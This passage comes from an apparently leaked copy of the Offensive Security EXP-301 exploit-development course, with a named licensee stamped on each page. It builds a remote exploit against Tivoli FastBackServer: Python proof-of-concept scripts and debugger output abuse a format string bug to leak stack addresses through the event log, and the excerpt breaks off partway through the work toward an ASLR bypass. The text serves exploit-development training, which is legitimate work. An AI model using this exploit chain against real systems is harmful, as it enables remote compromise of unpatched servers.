\n[Apr 22 00:10:05:029](15b4)->I4.GENERAL  \t:\t|------------------------------|------
|------|------|------|-------|--------|--------|--------|--------|                                  
' 
[+] Packet sent 
Listing 687 - Obtaining event log data 
We have received the event log data. This is a great success! 
Note that the request may fail to return data and multiple executions of the poc may be required. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
548 
This section concludes our initial work understanding how to remotely trigger a read from the 
event log. To make use of this in our exploit, we have to address several challenges, including 
determining the Start and Length values needed to read specific event log entries. 
We will also need to learn how to parse the data that is returned to us so it can be used 
programmatically in our exploit. 
11.3.5.1 Exercises 
1. 
Repeat the analysis on how to read event log data remotely. 
2. 
Update your proof of concept to obtain event log data remotely. 
11.4 Bypassing ASLR with Format Strings 
We have now discovered a format string vulnerability that allows us to disclose a stack address 
and have it written to the custom event log. We have also learned how to read from the event log. 
In the next three sections, we will combine these findings to first return the stack address, and 
then obtain the memory address of a DLL, which will allow us to bypass ASLR. 
11.4.1 
Parsing the Event Log 
Before we can leak the stack address from the event log, we need to learn how to read from a 
specific portion of it. In this section, we will dive into the way the Start and Length values 
determine what output is returned. 
From our reverse engineering, we know that the Length value determines the amount of data 
read. We also know that the value we supply is left-shifted by 8 bits, which equates to multiplying 
it by 0x100. 
What we don’t know yet is the maximum allowed value. To figure this out, let’s examine the 
response we got from the returned event log content. Specifically, we’ll review the first line, as 
given in Listing 688. 
kali@kali:~$ python3 poc.py 192.168.120.10 
b'\x00\x02\x00\x00  \n[Apr 22 00:10:04:998](15b4)->I4.GENERAL  \t:\t|tOA  
... 
Listing 688 - The initial response from reading the event log 
As highlighted in the output, the first four bytes are a byte array containing the Length value, left-
shifted by 8 bits. This means that when the content is returned to us, we’ll also get its size as the 
first four bytes. 
To take advantage of this, we will only receive the first four bytes of the reply and convert that to 
an integer. We can then perform multiple requests with an increasing Length value and check the 
corresponding reply for errors. 
The code for this can be adapted from the previous proof of concept by moving the packet 
creation, transmission, and reception into a for loop. 
We also want to limit the reply from the server to just four bytes. These four bytes are then 
converted to an integer and printed along with the original Length value. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
549 
if len(sys.argv) != 2: 
        print("Usage: %s <ip_address>\n" % (sys.argv[0])) 
        sys.exit(1) 
     
    server = sys.argv[1] 
    port = 11460 
     
    for l in range(0x100): 
        # psAgentCommand 
        buf = pack(">i", 0x400) 
        buf += bytearray([0x41]*0xC) 
        buf += pack("<i", 0x520)  # opcode 
        buf += pack("<i", 0x0)    # 1st memcpy: offset 
        buf += pack("<i", 0x100)  # 1st memcpy: size field 
        buf += pack("<i", 0x100)  # 2nd memcpy: offset 
        buf += pack("<i", 0x100)  # 2nd memcpy: size field 
        buf += pack("<i", 0x200)  # 3rd memcpy: offset 
        buf += pack("<i", 0x100)  # 3rd memcpy: size field 
        buf += bytearray([0x41]*0x8) 
 
        # psCommandBuffer 
        buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x100 * (l+1))   
        buf += b"B" * 0x100  
        buf += b"C" * 0x100  
 
        # Padding 
        buf += bytearray([0x41]*(0x404-len(buf))) 
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((server, port)) 
         
        s.send(buf) 
        response = s.recv(4) 
        size = int(response.hex(),16) 
 
        print("Length value is: " + str(hex(0x100 * (l+1))) + " The size returned is: 
" + str(hex(size))) 
 
        s.close() 
 
    sys.exit(0) 
Listing 689 - Loop to test values of Length 
Let’s execute the proof of concept and check the Length value against the corresponding return 
size, as shown in Listing 690. 
kali@kali:~$ python3 poc.py 192.168.120.10 
Length value is: 0x100 The size returned is: 0x10000 
Length value is: 0x200 The size returned is: 0x20000 
Length value is: 0x300 The size returned is: 0x30000 
Length value is: 0x400 The size returned is: 0x40000 
Length value is: 0x500 The size returned is: 0x50000 
Length value is: 0x600 The size returned is: 0x60000 
Length value is: 0x700 The size returned is: 0x70000 
Length value is: 0x800 The size returned is: 0x80000 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
550 
Length value is: 0x900 The size returned is: 0x90000 
Length value is: 0xa00 The size returned is: 0xa0000 
Length value is: 0xb00 The size returned is: 0xb0000 
Length value is: 0xc00 The size returned is: 0xc0000 
Length value is: 0xd00 The size returned is: 0xd0000 
Length value is: 0xe00 The size returned is: 0xe0000 
Length value is: 0xf00 The size returned is: 0xf0000 
Length value is: 0x1000 The size returned is: 0x100000 
Length value is: 0x1100 The size returned is: 0x1 
Length value is: 0x1200 The size returned is: 0x1 
Length value is: 0x1300 The size returned is: 0x1 
Length value is: 0x1400 The size returned is: 0x1 
... 
Listing 690 - Result of Length enumeration 
The output reveals that a Length value larger than 0x1000 results in an error. With the value 
0x1000, we can read as much of the log entry as possible at once. 
We should note that after running the testing code and obtaining the error, we have to restart the 
FastBackServer service to obtain usable results again. 
Now that we know the optimal value for Length, let’s turn to the Start value. 
We already have most of the required knowledge from our work earlier. The Start value chooses 
both which log file to read from and the offset into the chosen log file. 
While we were able to determine and hardcode the best value for Length, the Start value must be 
found dynamically when we execute the exploit. 
Let’s keep in mind that new log entries are added at the end of the log file with the suffix 040. 
When we leak the stack pointer and subsequently read from the event log, we expect the stack 
pointer leak to be among the newest entries. 
Knowing all of this, we still can’t find a specific Start value. Instead, we need to choose one in 
such a way that a read operation will reach the end of the newest log file. 
The size of the content read from the event log is returned to us in the first four bytes of the TCP 
packet. This means we can perform a loop by beginning with a Start value of 0, and then use the 
size to determine if we reached the end of the log. 
If the returned data size is 0x100000, we will need to increase the Start value and try again. By 
increasing the Start value, we will eventually reach the end of the log file. At that point, less data 
than 0x100000 will be read, and the returned size is expected to be less than 0x100000. 
We can test this by once again adapting our initial event log read code, as given in Listing 691. 
server = sys.argv[1] 
port = 11460 
 
startValue = 0 
 
while True: 
 
  # psAgentCommand 
    buf = pack(">i", 0x400) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
551 
    buf += bytearray([0x41]*0xC) 
    buf += pack("<i", 0x520)  # opcode 
    buf += pack("<i", 0x0)    # 1st memcpy: offset 
    buf += pack("<i", 0x100)  # 1st memcpy: size field 
    buf += pack("<i", 0x100)  # 2nd memcpy: offset 
    buf += pack("<i", 0x100)  # 2nd memcpy: size field 
    buf += pack("<i", 0x200)  # 3rd memcpy: offset 
    buf += pack("<i", 0x100)  # 3rd memcpy: size field 
    buf += bytearray([0x41]*0x8) 
 
    # psCommandBuffer 
    buf += b"FileType: %d ,Start: %d, Length: %d" % (1, startValue, 0x1000)   
    buf += b"B" * 0x100  
    buf += b"C" * 0x100  
 
    # Padding 
    buf += bytearray([0x41]*(0x404-len(buf))) 
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect((server, port)) 
         
    s.send(buf) 
    response = s.recv(4) 
    size = int(response.hex(),16) 
 
    print("Start value of " + str(hex(startValue)) + " Yields a data size of: " + 
str(hex(size))) 
    startValue += 0x1000 
    s.close() 
         
sys.exit(0) 
Listing 691 - Code to enumerate Start values 
We can perform a read from the event log with the given Start value and print out the returned 
data length. The increase in the size of Start by 0x1000 is arbitrary, but we will find it to be 
appropriate. 
When the proof of concept is executed, we will check the Start value against the associated data 
size. 
kali@kali:~$ python3 poc.py 192.168.120.10 
Start value of 0x0 Yields a data size of: 0x100000 
Start value of 0x1000 Yields a data size of: 0x100000 
Start value of 0x2000 Yields a data size of: 0x100000 
... 
Start value of 0x60000 Yields a data size of: 0x100000 
Start value of 0x61000 Yields a data size of: 0x100000 
Start value of 0x62000 Yields a data size of: 0xe3603 
Start value of 0x63000 Yields a data size of: 0x1 
Start value of 0x64000 Yields a data size of: 0x1 
Start value of 0x65000 Yields a data size of: 0x1 
Listing 692 - Enumerating Start values 
As highlighted in Listing 692, the output offers three data size options: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
552 
1. 
0x10000, meaning we have not found the end of the log yet. 
2. 
Between 0x1 and 0x10000, meaning we have found the end of the log. 
3. 
0x1, meaning the Start value is too large. 
We’ll remember that after running the testing code and obtaining the error, we have to restart 
FastBackServer for the data size return value to be correct. 
If the Tivoli installation has been running for a long time, the event log may have 
grown so large that initial requests will also return a value of 0x1. 
We could simply pick the first Start value that results in a data size between 0x1 and 0x100000, 
but that might lead to some issues. 
Our selection of the Start value happens before the stack leak is performed. This means that 
additional data will be written to the event log before we use the Start value to read the stack 
address. 
Figure 205 illustrates how the distance from the Start value to the end of the log file must be less 
than 0x100000 both before and after the stack leak. 
 
Figure 205: Read before and after stack address leak 
If we select a Start value where the returned size is close to 0x100000, data written to the event 
log between our enumeration and the read of the leak could put the stack address outside that 
range. 
Likewise, if the result returned is 0x1 due to the Start value being too large, we will encounter 
issues with the read method in subsequent calls. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
553 
We can address this issue by using the returned data size to calculate the optimal Start value. 
We’ll recall that the Length value is left-shifted by 8 bits before being used, which means the data 
size returned can be right-shifted and added to the Start value. 
Our calculations will result in a Start value that points right to the end of the log file before the 
stack leak is triggered. It is very likely that another read from the event log will contain the leaked 
stack address. 
Listing 693 shows the required code modifications for our calculations. 
while True: 
    ... 
    s.send(buf) 
    response = s.recv(4) 
    size = int(response.hex(),16) 
    print("Start value of: " + str(hex(startValue)) + " yields a data size of: " + 
str(hex(size))) 
    if size < 0x100000: 
        size = size >> 8 
        startValue += size 
        break 
    startValue += 0x1000 
    s.close() 
     
print("The optimal start value is: " + str(hex(startValue))) 
Listing 693 - Improved code to enumerate Start values 
Listing 694 shows the updated code in action. 
kali@kali:~$ python3 poc.py 192.168.120.10 
... 
Start value of: 0x5f000 yields a data size of: 0x100000 
Start value of: 0x60000 yields a data size of: 0x100000 
Start value of: 0x61000 yields a data size of: 0x100000 
Start value of: 0x62000 yields a data size of: 0x9b103 
The optimal start value is: 0x629b1 
Listing 694 - Located optimal Start value 
We have now succeeded in dynamically locating the optimal Start value. This will allow us to read 
newly-added content to the event log. 
We’ll note that when FastBackServer has been installed and running for a while, large Start values 
are common. We can speed up the exploit for development purposes by starting at a high initial 
value instead of 0. 
In this section, we learned how to select both the Length and the Start values so that we will be 
able to read the formatted string containing the stack address from the event log. 
11.4.1.1 Exercises 
1. 
Repeat the analysis and locate the optimal Length and Start values. 
2. 
Rewrite the code for locating the optimal Start value into a function.  
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
554 
11.4.2 
Leak Stack Address Remotely 
Finally, we have analyzed all the required pieces to perform a remote stack address leak. In this 
section, we will combine the format string vulnerability with the ability to read from the event log 
to obtain the stack address on our Kali machine. 
Earlier in this module, we located the event log entry containing the stack address leak. This is 
repeated in Listing 695. 
PS C:\Tools> Get-Content 
C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf -Tail 1 
[Apr 28 00:21:55:849](1910)-->W8.AGI            :       AGI_S_GetAgentSignature: 
couldn't find agent 
c4d95ded4782512e7805f49474165475f53656741746953746e74616e673a657275756f6320276e646c696
620746120646e746e65672578252025782578257825782578257825782578257825782578257825 
Listing 695 - Formatted string as an event entry 
Even with our ability to read from the log file, we cannot easily pinpoint this specific entry nor the 
stack address itself. 
We can locate it easily if we modify the format string to contain a unique header, and then search 
through the event log data for it. 
The formatted string also contains multiple values and we must identify the correct value 
representing the stack address. We can address this by inserting a symbol between each format 
specifier. 
Listing 696 shows the modified psCommandBuffer of the previous Python script invoking the 
EventLog function. 
# psCommandBuffer 
buf += b"w00t:" + b"%x:" * 0x80   
buf += b"B" * 0x100  
buf += b"C" * 0x100  
Listing 696 - Unique value is inserted in format string 
The first part of the psCommandBuffer has been prepended with the unique header value “w00t”, 
as well as a colon between each format string specifier. 
After updating the format string vulnerability code, let’s examine how this helps us read the 
content written to the event log. 
Since the event log is written to frequently, we’ll set a breakpoint in WinDbg on the call to 
AGI_S_GetAgentSignature (Listing 697). This will pause all other writes to the event log by the 
application. 
Once the breakpoint is hit, we can step over the call and find the stack address is written to the 
event log: 
0:078> bp FastBackServer!AGI_S_GetAgentSignature+0xd8 
 
0:078> g 
Breakpoint 0 hit 
eax=0d993b30 ebx=0621b758 ecx=021df978 edx=00976a78 esi=0621b758 edi=00669360 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
555 
eip=0054b69b esp=0d93e2dc ebp=0d93e31c iopl=0         nv up ei ng nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297 
FastBackServer!AGI_S_GetAgentSignature+0xd8: 
0054b69b e8914df3ff      call    FastBackServer!EventLog (00480431) 
 
0:007> p 
eax=00000001 ebx=0621b758 ecx=0d93d184 edx=76fc1670 esi=0621b758 edi=00669360 
eip=0054b6a0 esp=0d93e2dc ebp=0d93e31c iopl=0         nv up ei pl nz ac pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216 
FastBackServer!AGI_S_GetAgentSignature+0xdd: 
0054b6a0 83c410          add     esp,10h 
Listing 697 - Breakpoint on call to EventLog 
Since WinDbg has paused FastBackServer, no additional writes are performed. 
With the entry written, let’s dump the newest entries from the event log with PowerShell. 
PS C:\Tools> Get-Content 
C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf -Tail 2 
[May 03 16:01:49:475](174c)-->W8.AGI            :       AGI_S_GetAgentSignature: 
couldn't find agent 
w00t:c4:d93ded4:3a:25:12e:78:0:5f494741:65475f53:65674174:6953746e:74616e67:3a657275:7
56f6320:276e646c:69662074:6120646e:746e6567:30307720:78253a74:3a78253a:253a7825 
[May 03 16:01:49:475](174c)-->W8.AGI            :       
..:c4:d93df96:3a:25:6c:78:0:5f494741:65475f53:65674174:6953746e:74616e67:3a657275:756f
6320:276e646c:69662074:6120646e:746e6567:30307720:78253a74:3a78253a:253a7825:78253a78:
3a78253a:253a7825:78253a78:3a78253a:25 
Listing 698 - Dumping the newest events from the event log 
The content of the event log shows that our “w00t” is prepended to the format specifiers, and 
each value inserted by the format specifiers is separated by colons. 
We’ll also note that the leaked stack address is the second value after the “w00t” header. This 
modification will allow us to parse the retrieved data in Python by searching for the line that starts 
with “w00t”, split that line on colons, and select the second value. 
At this point, we need to combine the code for triggering the format string vulnerability with the 
code for locating the optimal Start value, as well as implement code to read the newest entries. 
First, let’s find the Start value. We can do this by implementing the previous while loop inside a 
function (findStartValue) to make the code easier to manage. After locating the optimal Start 
value, we’ll insert the code to trigger the format string vulnerability. 
Finally, we need to read the contents of the event log, so let’s review some aspects of how TCP 
traffic works. 
TCP guarantees that all the network data is delivered, and delivered in the right order. It does not, 
however, specify how many network packets are used to transmit the data, or whether they will 
be of equal size. 
To ensure we receive all the event log data, we must detect when there is none left. Luckily, this is 
easy since FastBackServer returns the total data size in the first 4 bytes. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
556 
Listing 699 shows the code related to detecting when all data has been received. We’ll need to 
keep in mind that the code to locate the Start value triggering the format string vulnerability, as 
well as reading from the event log, is also required. 
... 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((server, port)) 
s.send(buf) 
 
responseSize = s.recv(4) 
size = int(responseSize.hex(),16) 
print("The eventlog returned contains %x bytes" % size) 
 
aSize = 0 
eventData = b"" 
while True: 
    tmp = s.recv(size - aSize) 
    aSize += len(tmp) 
    eventData += tmp 
    if aSize == size: 
        break 
s.close() 
print("The size read is: " + str(hex(aSize))) 
print(eventData) 
... 
Listing 699 - Python code to receive the event log 
We can implement the while loop shown in Listing 699 to first get the size of the total reply and 
keep reading from the socket until we have received that amount of data, aggregating the size in 
aSize and data in eventData. 
To track the progress of our code, we can print the size of the event log data we expect to receive. 
After we are done receiving data, we will print the aggregated amount along with the event log 
data itself. 
Execution of the updated proof of concept is shown in Listing 700. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x7cc1a 
Stack address is written to event log 
The eventlog returned contains da03 bytes 
The size read is: 0xda03 
b"  \n[May 13 23:07:56:133](14d8)->I4.FX_AGENT  
... 
\n[May 13 23:07:56:915](1704)-->W8.AGI      \t:\tAGI_S_GetAgentSignature: couldn't 
find agent 
w00t:c4:217dded4:3a:25:12e:78:0:5f494741:65475f53:65674174:6953746e:74616e67:3a657275:
756f6320:276e646c:69662074:6120646e:746e6567:30307720:78253a74:3a78253a:253a782\n[May 
13 23:07:57:039](14d8)->I4.FX_AGENT \t:\t3 - Command 0x0\ttime=0 
... 
Listing 700 - Reading the eventlog containing the stack address 
The output has been truncated to only show the relevant event log data. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
557 
The highlighted portion of the output given in the listing above shows the presence of the unique 
header and a stack address in the data we received. 
Next, we’ll use the header value to dynamically locate the stack address in the event log data. 
The required parsing code is given in Listing 701.  
data = eventData.split(b"w00t:") 
values = data[1].split(b":") 
stackAddr = int(values[1],16) 
print("Leaked stack address is: " + str(hex(stackAddr))) 
Listing 701 - Code to parse the event log 
First, we’ll use the split387 function by supplying the string “w00t:” and breaking up the entire event 
log into two byte arrays (data). 
In the second index of the array (data[1]), we find the stack address. It comes after the static “c4:” 
value, meaning we can perform another split on the “:” delimiter and the stack address will be in 
the second entry (with an index of 1). 
Once the stack address is located, it is converted into an integer and printed to the console. 
Listing 702 shows the entire exploit code in action. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x666ea 
Stack address is written to event log 
The eventlog returned contains 6b03 bytes 
The size read is: 0x6b03 
Leaked stack address is: 0x237dded4 
Listing 702 - Locate stack address remotely 
We have remotely triggered the format string vulnerability and retrieved the stack address. 
Excellent! 
11.4.2.1 Exercises 
1. 
Follow the analysis and use a unique header to locate the correct log entry. 
2. 
Combine the previous proofs of concept to obtain one script that remotely leaks the stack 
address. 
3. 
Is the stack address static across multiple executions of the exploit? 
11.4.3 
Saving the Stack 
In the previous section, we managed to remotely trigger a format string specifier attack that 
writes a stack address to the event log. We were then able to request and parse the relevant 
portion of the event log to obtain it. 
If we run the exploit multiple times without restarting the FastBackServer service, we’ll notice that 
the stack address changes every time. 
 
387 (tutorialspoint, 2020), https://www.tutorialspoint.com/python3/string_split.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
558 
This is common for applications that handle multiple simultaneous connections by creating a 
new thread for each connection. 
In these types of applications, when the socket is closed, the thread is terminated. The stack 
address we leaked is no longer valid since each thread has a separate stack. To make use of the 
stack address, we must ensure that the thread is not terminated before our exploit completes. 
We can avoid the stack address changing by using the same socket session to both trigger the 
stack leak and the event log read. 
When we determined the optimal Start value earlier, we could leverage multiple 
socket connections because we had not yet leaked the stack address. 
We must create the socket and perform the connection once, but this introduces an issue to 
solve. When we send the packet with the format string specifiers that trigger the stack leak, data 
is also returned to us. 
This didn’t matter to us previously because we don’t need that data and the socket was simply 
closed, thus flushing any data from the connection. When we operate within the same 
connection, however, we must always read all available data before sending a new packet. 
Listing 703 shows the code needed to receive the reply. 
s.send(buf) 
 
responseSize = s.recv(4) 
size = int(responseSize.hex(),16) 
 
aSize = 0 
while True: 
    tmp = s.recv(size - aSize) 
    aSize += len(tmp) 
    if aSize == size: 
        break    
 
print("Stack address is written to event log") 
Listing 703 - Receive all data sent as a reply 
The code is almost identical to that used to receive the event log data, except that we do not keep 
an aggregate of data. 
Next, we’ll run the exploit as shown in Listing 704. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x673f0 
Stack address is written to event log 
The eventlog returned contains 5d03 bytes 
The size read is: 0x5d03 
Leaked stack address is: 0x27bdded4 
Listing 704 - The updated code leaks the stack from the same connection session 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
559 
We obtain the same type of output as earlier, including the leak of the stack address. 
While the change introduced in this section seems negligible, it will be very important in the next 
section, when we take the stack leak one step forward and bypass ASLR. 
11.4.3.1 Exercises 
1. 
Update the proof of concept to use only a single connection when performing the stack leak 
and event log read. 
2. 
Is it possible to perform all actions in the exploit from a single connection and, if so, does it 
increase the efficiency? 
11.4.4 
Bypassing ASLR 
Achieving a remote leak of a stack address is interesting, but it does not directly allow us to 
bypass ASLR and in such a way that we can build a ROP chain. We must leak an address inside 
either a Tivoli module or a native DLL. 
In this section, we will build upon the stack leak and reuse the format string specifier vulnerability 
to obtain the base address of Kernelbase.dll. 
First, we need to understand how the leaked stack address can provide us with an address inside 
Kernelbase.dll, and then we will work to obtain it. 
When we made a connection in the previous section, a new thread was created to handle the 
packets. It is a stack address from this new thread that was leaked back to us. If we pause 
Python execution after leaking the stack address, but before closing the connection to 
FastBackServer, we can inspect the contents at that stack address in WinDbg. 
To pause execution of our Python script, we’ll use the input388 function to wait for console input 
before we call the close method on the socket. 
stackAddr = int(values[1],16) 
print("Leaked stack address is: " + str(hex(stackAddr))) 
input(); 
s.close() 
sys.exit(0) 
Listing 705 - Pause Python execution with input 
We’ll note that the call to close the connection is moved to just before the script terminates. 
When the script executes, we obtain the stack address and execution waits for our console input, 
as shown in Listing 706. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x61ca1 
Stack address is written to event log 
The eventlog returned contains 1203 bytes 
The size read is: 0x1203 
Leaked stack address is: 0x1035ded4 
 
388 (Python, 2020), https://docs.python.org/3/library/functions.html#input 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
560 
Listing 706 - Execution is paused after leaking the stack address 
Now we can attach WinDbg to FastBackServer and inspect the contents at the leaked stack 
address. 
The stack often contains pointers to various DLLs that we could use to bypass ASLR. To locate 
consistent addresses, let’s start by inspecting data close to the currently leaked address across 
multiple reruns of both the exploit and the service. 
Listing 707 shows the stack content at lower addresses than the leaked one. Trial and error 
reveals that pointers located at higher addresses are not stable across multiple packet 
transmissions. 
0:063> dds 1035ded4-200*4 L200 
1035d6d4  00000000 
1035d6d8  00000000 
... 
1035dd68  00000320 
1035dd6c  00000001 
1035dd70  7720f11f ntdll!RtlDeactivateActivationContextUnsafeFast+0x9f 
1035dd74  1035dde0 
1035dd78  745dc36a KERNELBASE!WaitForSingleObjectEx+0x13a 
1035dd7c  745dc2f9 KERNELBASE!WaitForSingleObjectEx+0xc9 
1035dd80  00669360 FastBackServer!_beginthreadex+0x6b 
1035dd84  7720e323 ntdll!RtlActivateActivationContextUnsafeFast+0x73 
... 
Listing 707 - Kernelbase pointers on the stack 
The output in the listing above is greatly truncated due to the amount of data. 
We’ll find numerous pointers to Kernelbase.dll, ntdll.dll, and FastBackServer.exe on the stack. At 
first glance, any of those pointers could be used, but there are some considerations to take into 
account. 
Addresses in FastBackServer.exe contain null bytes, so these are not a good candidate for 
generating a ROP chain. 
To execute shellcode, we must invoke an API like VirtualProtect or VirtualAlloc, but ntdll.dll only 
contains low level versions of these that take more complicated arguments. 
To preserve stability, we should choose a pointer inside Kernelbase.dll that is a decent amount of 
bytes lower than the leaked address. This ensures that the same pointer is present at the same 
location on multiple reruns of the exploit and across an arbitrary amount of transmitted packets. 
Through trial and error, we’ll discover the address KERNELBASE!WaitForSingleObjectEx+0x13a, 
highlighted in Listing 707, remains stable at the same stack offset. We’ll use this during the 
remainder of this module. 
Next, we need to calculate the offset from the leaked stack address to the address containing the 
pointer. 
0:063> ? 1035ded4-1035dd78 
Evaluate expression: 348 = 0000015c 
Listing 708 - Offset from leaked stack address to Kernelbase.dll pointer 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
561 
We find the offset to be the static value 0x15C. We should note that this offset must be 
subtracted from the leaked stack address. 
Since this offset remains constant across multiple reruns of the exploit, we know where an 
address into Kernelbase.dll is located in memory when the stack address is leaked back to us. 
Let’s use this knowledge to obtain the pointer remotely. We will reuse our two basic building 
blocks: the format string specifier vulnerability and our ability to remotely read the event log. 
When the “%x” specifier is used, an integer is inserted into the string and interpreted as a 
hexadecimal value. However, the “%s” specifier interprets the argument as a character array, 
meaning the argument itself is a memory pointer to a null byte-terminated series of ASCII 
characters. 
The format string function uses the specifier by dereferencing the argument and inserting the 
contents at that memory location into the processed format string. 
If we could put a string specifier into the call to EventLog and make it use the leaked stack 
address, plus the offset as an argument, it would read out the address inside Kernelbase.dll. 
Let’s put this theory to the test. We’ll start by reviewing how the vulnerable vsnprintf format string 
function works. 
Listing 709 repeats the function prototype of vsnprintf. 
int vsnprintf( 
  char *s, 
  size_t n, 
  const char *format, 
  va_list arg 
); 
Listing 709 - Function prototype for vsnprintf 
We know that the format string supplied to this function is controlled by us, so we can replace 
any “%x” with “%s”. In the current leak of the stack address, we did not have to do anything, since 
the stack address was already present, but this time we must also provide the address to leak 
from. 
The arguments for the format string specifier come from the array supplied as the fourth 
argument (arg). This means if we can somehow influence the contents of this array, the stack 
address to read from can be inserted within. 
Let’s execute our current proof of concept and inspect the call to vnsprintf at 
FastBackServer!EventLog_wrapted+0x2dd. Sadly, we discover it is not productive to set a 
breakpoint either here or inside the EventLog function due to their common usage. 
Instead, we’ll set a breakpoint at FastBackServer!AGI_S_GetAgentSignature+0xd8, just like in our 
initial 
vulnerability 
analysis, 
and 
then 
set 
a 
breakpoint 
on 
FastBackServer!EventLog_wrapted+0x2dd which is only triggered in the same threat context 
through the keyword ~.389 
 
389 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/bp--bu--bm--set-breakpoint- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
562 
Once we reach it, we can display the contents of the fourth argument, which is the array used with 
the format string specifiers: 
eax=0000002d ebx=0614aa10 ecx=1079dca5 edx=000001c7 esi=0614aa10 edi=00669360 
eip=004803fa esp=1079dc14 ebp=1079dea4 iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212 
FastBackServer!EventLog_wrapted+0x2dd: 
004803fa e834ad1d00      call    FastBackServer!ml_vsnprintf (0065b133) 
 
0:082> dc poi(esp+c) 
1079deb8  000000c4 1079ded4 0000003a 00000025  ......y.:...%... 
1079dec8  0000012e 00000078 00000000 5f494741  ....x.......AGI_ 
1079ded8  65475f53 65674174 6953746e 74616e67  S_GetAgentSignat 
1079dee8  3a657275 756f6320 276e646c 69662074  ure: couldn't fi 
1079def8  6120646e 746e6567 30307720 78253a74  nd agent w00t:%x 
1079df08  3a78253a 253a7825 78253a78 3a78253a  :%x:%x:%x:%x:%x: 
1079df18  253a7825 78253a78 3a78253a 253a7825  %x:%x:%x:%x:%x:% 
1079df28  78253a78 3a78253a 253a7825 78253a78  x:%x:%x:%x:%x:%x 
Listing 710 - Contents of the array argument to vsnprintf 
Interestingly, we’ll observe that the unique header “w00t”, which we provided along with the 
format string specifiers themselves, has become part of the arguments. 
This means that if we insert a value just after the header, it will be used as an argument for 
vsnpritnf and become part of the formatted string that is written to the event log. 
We notice in Listing 710 that due to alignment of the header, we must add two additional bytes 
before the values we want to be processed in order for our value to be taken as a separate 
DWORD. 
Let’s test this by modifying our proof of concept, as shown in Listing 711. 
... 
# psCommandBuffer 
buf += b"w00t:BBAAAA" + b"%x:" * 0x80   
buf += b"B" * 0x100  
buf += b"C" * 0x100  
... 
values = data[1].split(b":") 
print(values) 
... 
Listing 711 - Appending A’s after the header 
The two B’s have been appended to the header to account for alignment explained above, 
followed by four A’s, which we’ll invoke through the specifier as a trial. 
We have also added a print statement of the event log after it has been split on the “:” delimiter. 
We can use this to verify our theory without using the debugger. 
When the code is executed, we find the four A’s, as highlighted in Listing 712. 
kali@kali:~$ python3 poc.py 192.168.120.10 
The optimal start value is: 0x61fe7 
Stack address is written to event log 
The eventlog returned contains 1103 bytes 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
563 
The size read is: 0x1103 
[b'BBAAAAc4', b'1029ded4', b'3a', b'25', b'12e', b'78', b'0', b'5f494741', 
b'65475f53', b'65674174', b'6953746e', b'74616e67', b'3a657275', b'756f6320', 
b'276e646c', b'69662074', b'6120646e', b'746e6567', b'30307720', b'42423a74', 
b'41414141', b'2\n[May 14 10', b'58', b'05', b'032](1b60)->I4.FX_AGENT \t', b'\t1 - 
... 
Leaked stack address is: 0x1029ded4 
Listing 712 - Output from appending A’s 
